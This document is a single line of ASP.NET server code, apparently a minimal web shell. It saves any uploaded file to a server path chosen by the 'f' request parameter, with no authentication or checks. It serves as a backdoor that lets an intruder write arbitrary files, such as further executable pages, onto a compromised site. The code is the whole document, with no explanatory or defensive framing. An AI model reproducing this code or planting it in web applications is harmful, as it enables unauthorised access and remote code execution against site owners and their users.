<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"]) ); }%>
